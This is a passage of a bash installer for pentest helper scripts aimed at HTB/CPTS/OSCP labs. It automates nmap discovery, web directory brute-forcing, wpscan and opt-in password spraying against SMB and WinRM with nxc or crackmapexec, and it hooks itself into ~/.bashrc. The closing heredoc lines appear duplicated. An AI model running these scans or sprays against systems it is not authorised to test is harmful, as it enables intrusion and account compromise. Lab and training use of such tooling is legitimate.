        timeout "${FFUF_TIMEOUT:-120}" ffuf -w "${FFUF_WORDLIST}" -u "${url}/FUZZ" -e ".${FFUF_EXT}" -ac -t 40 \
          > "${hostdir}/web/ffuf_${p}.txt" 2>&1 || true
      elif [[ "${RUN_FEROX:-0}" == "1" ]] && have feroxbuster; then
        timeout "${FFUF_TIMEOUT:-120}" feroxbuster -u "${url}" ${FEROX_OPTS:-} \
          > "${hostdir}/web/ferox_${p}.txt" 2>&1 || true
      elif [[ "${RUN_GOBUSTER:-0}" == "1" ]] && have gobuster; then
        timeout "${GOBUSTER_TIMEOUT:-120}" gobuster dir -u "${url}" -w "${GOBUSTER_WORDLIST}" -x "${GOBUSTER_EXT}" -q \
          > "${hostdir}/web/gobuster_${p}.txt" 2>&1 || true
      fi

      if [[ "${RUN_WPSCAN:-0}" == "1" ]] && have wpscan; then
        if grep -qi "wp-content\|wordpress" "${hostdir}/web/home_${p}.html" 2>/dev/null; then
          wpscan --url "${url}" ${WPSCAN_OPTS:-} > "${hostdir}/web/wpscan_${p}.txt" 2>&1 || true
        fi
      fi
    fi
  done

  # Optional spray (still OFF by default)
  if [[ "${ENABLE_SPRAY:-0}" == "1" ]]; then
    say "Spray enabled (timebox & be intentional)."
    if have nxc && [[ -f "${SPRAY_USERS_FILE:-}" && -f "${SPRAY_PASSWORDS_FILE:-}" ]]; then
      nxc smb "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_smb.txt" 2>&1 || true
      nxc winrm "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_winrm.txt" 2>&1 || true
    elif have netexec && [[ -f "${SPRAY_USERS_FILE:-}" && -f "${SPRAY_PASSWORDS_FILE:-}" ]]; then
      netexec smb "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_smb.txt" 2>&1 || true
    elif have crackmapexec && [[ -f "${SPRAY_USERS_FILE:-}" && -f "${SPRAY_PASSWORDS_FILE:-}" ]]; then
      crackmapexec smb "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_smb.txt" 2>&1 || true
    else
      warn "Spray requested but tooling/users/password files missing. Skipping."
    fi
  fi
}

# Subnet mode
if [[ "${TARGET}" == */* ]]; then
  say "Subnet mode discovery: ${TARGET}"

  disc="${BOXDIR}/01_scans/discovery_$(ts)"
  nmap -sn "${TARGET}" -oA "${disc}" >/dev/null 2>&1 || true

  ips=()
  if [[ -f "${disc}.gnmap" ]]; then
    while read -r line; do
      ip=$(echo "$line" | awk '{print $2}')
      ips+=("$ip")
    done < <(grep "Up" "${disc}.gnmap" || true)
  fi

  if [[ ${#ips[@]} -eq 0 ]]; then
    warn "No live hosts found via ICMP. Try TCP discovery:"
    warn "  nmap -Pn -p ${NMAP_FAST_PORTS} --open ${TARGET} -oA ${BOXDIR}/01_scans/tcp_discovery"
    exit 0
  fi

  for ip in "${ips[@]}"; do
    scan_host "$ip"
  done
else
  scan_host "${TARGET}"
fi

say "Done. Review:"
say "  - ${BOXDIR}/07_notes/enum_runs.log"
say "  - ${BOXDIR}/hosts/<ip>/{scans,enum,web,ad,loot}"
say "Cracking helper: crack --tool john|hashcat ..."
EOF
  chmod +x "${BIN}/enum"
fi

# --- PATH + aliases ---
SNIP="${ROOT}/.shellrc_snippet"
cat > "${SNIP}" <<EOF
# pentest-journal helpers (HTB/CPTS/OSCP tuned)
export PATH="\$PATH:${BIN}"
alias makebox='makebox'
alias enum='enum'
alias mkcombo='mkcombo'
alias sync_wordlists='sync_wordlists'
alias crack='crack'
alias stage='stage'
EOF

BASHRC="${HOME}/.bashrc"
append_if_missing "${BASHRC}" "# pentest-journal helpers (HTB/CPTS/OSCP tuned)" "source \"${SNIP}\" 2>/dev/null # pentest-journal helpers (HTB/CPTS/OSCP tuned)"

say "Installed."
say "Next steps (workflow):"
echo "  1) Open NEW terminal (or run: source ~/.bashrc)"
echo "  2) (Optional) Sync small wordlists: sync_wordlists (then: mkcombo)"
echo "  3) Create workspace: makebox <Name> <IP|SUBNET>"
echo "  4) Run enum:        enum --box <Name>            (fast)"
echo "  5) Full ports:      enum --box <Name> --full"
echo "  6) Add vuln scripts enum --box <Name> --vuln     (timeboxed)"
echo "  7) Stage helpers:   stage --box <Name> --attacker <YOUR_IP>"
echo
warn "Spraying remains OFF by default. Enable only per box.conf and timebox it."
EOF
  chmod +x "${BIN}/enum"
fi
